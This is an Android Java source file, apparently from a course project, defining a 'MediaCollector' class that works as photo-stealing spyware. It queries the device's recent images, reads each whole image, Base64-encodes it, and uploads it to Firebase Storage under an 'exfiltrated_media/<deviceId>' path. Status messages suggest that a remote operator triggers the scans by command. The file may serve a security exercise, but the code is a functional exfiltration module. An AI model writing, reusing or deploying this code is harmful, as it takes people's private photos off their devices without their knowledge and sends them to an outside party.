package com.example.inf2007_mad_j1847.test;

import android.content.ContentUris;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MediaCollector {
    private static final String TAG = "Test-MediaCollector";
    private static List<Map<String, String>> mediaBuffer = new ArrayList<>();
    private static boolean scanInProgress = false;
    private static int lastScanCount = 0;
    private static String scanError = null;

    public static List<Map<String, String>> scanRecentMedia(Context context, int maxItems) {
        scanInProgress = true;
        scanError = null;
        List<Map<String, String>> results = new ArrayList<>();

        try {
            // Check permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                String permission = android.Manifest.permission.READ_MEDIA_IMAGES;
                if (context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    scanError = "Missing READ_MEDIA_IMAGES permission";
                    return results;
                }
            }

            // Query images
            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED
            };

            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

            Cursor cursor = null;
            try {
                cursor = context.getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        null,
                        null,
                        sortOrder
                );

                if (cursor == null) {
                    scanError = "Failed to query media store";
                    return results;
                }

                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);

                int count = 0;
                while (cursor.moveToNext() && count < maxItems) {
                    long id = cursor.getLong(idColumn);
                    String name = cursor.getString(nameColumn);
                    long date = cursor.getLong(dateColumn);

                    Map<String, String> map = new HashMap<>();
                    map.put("id", String.valueOf(id));
                    map.put("name", name);
                    map.put("date", String.valueOf(date));
                    results.add(map);
                    count++;
                }

            } finally {
                if (cursor != null) cursor.close();
            }

            mediaBuffer.clear();
            mediaBuffer.addAll(results);
            lastScanCount = results.size();

        } catch (Exception e) {
            scanError = "Error: " + e.getMessage();
            Log.e(TAG, "Scan error", e);
        } finally {
            scanInProgress = false;
        }

        return results;
    }

    public static String getScanStatus() {
        if (scanInProgress) {
            return "⏳ Scanning...";
        }
        if (scanError != null) {
            Log.e(TAG, "========== SCAN ERROR DETAILS ==========");
            Log.e(TAG, scanError);
            Log.e(TAG, "========================================");

            if (scanError.contains("permission") || scanError.contains("Permission")) {
                return "❌ Need: READ_MEDIA_IMAGES";
            } else if (scanError.contains("cursor") || scanError.contains("query")) {
                return "❌ Database error";
            } else if (scanError.contains("null")) {
                return "❌ Null pointer";
            } else {
                return "❌ Scan failed - check logs";
            }
        }
        if (lastScanCount > 0) {
            return "✅ Found " + lastScanCount + " images";
        }
        return "⚠️ Run 'scan_media' first";
    }

    public static List<Map<String, String>> getCollectedMedia() {
        return new ArrayList<>(mediaBuffer);
    }

    public static void clearCollectedMedia() {
        mediaBuffer.clear();
    }

    public static Map<String, String> getImageInfo(Context context, String imageId) {
        try {
            Uri uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    Long.parseLong(imageId)
            );

            String[] projection = {
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED
            };

            Cursor cursor = context.getContentResolver().query(
                    uri,
                    projection,
                    null,
                    null,
                    null
            );

            if (cursor != null) {
                try {
                    if (cursor.moveToFirst()) {
                        int nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                        int sizeIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                        int dateIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);

                        Map<String, String> infoMap = new HashMap<>();
                        infoMap.put("name", cursor.getString(nameIndex));
                        infoMap.put("size", String.valueOf(cursor.getLong(sizeIndex)));
                        infoMap.put("date", String.valueOf(cursor.getLong(dateIndex)));

                        return infoMap;
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting image info: " + e.getMessage());
        }
        return null;
    }

    public static String getFullImage(Context context, String imageId) {
        try {
            Uri uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    Long.parseLong(imageId)
            );

            InputStream inputStream = context.getContentResolver().openInputStream(uri);
            if (inputStream != null) {
                try {
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                    byte[] data = new byte[8192];
                    int bytesRead;

                    while ((bytesRead = inputStream.read(data)) != -1) {
                        buffer.write(data, 0, bytesRead);
                    }

                    return Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP);
                } finally {
                    inputStream.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting full image: " + e.getMessage());
        }
        return null;
    }

    public static void uploadToFirebase(Context context, String imageId, String deviceId) {
        try {
            String imageData = getFullImage(context, imageId);
            if (imageData == null) {
                Log.e(TAG, "Failed to get image data for ID: " + imageId);
                return;
            }

            // Get image name
            Map<String, String> info = getImageInfo(context, imageId);
            String fileName = info != null ? info.get("name") : "image_" + imageId + ".jpg";

            // Decode Base64 to bytes
            byte[] imageBytes = Base64.decode(imageData, Base64.DEFAULT);

            // Create path in exfiltrated_media folder
            String timestamp = String.valueOf(System.currentTimeMillis());
            String path = "exfiltrated_media/" + deviceId + "/" + timestamp + "_" + fileName;

            // Upload to Firebase Storage
            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference().child(path);

            Log.d(TAG, "📤 Uploading to: " + path);

            UploadTask uploadTask = storageRef.putBytes(imageBytes);
            uploadTask.addOnSuccessListener(taskSnapshot -> {
                Log.d(TAG, "✅ Upload successful!");
            }).addOnFailureListener(e -> {
                Log.e(TAG, "❌ Upload failed: " + e.getMessage());
            });

        } catch (Exception e) {
            Log.e(TAG, "Upload error: " + e.getMessage());
        }
    }
}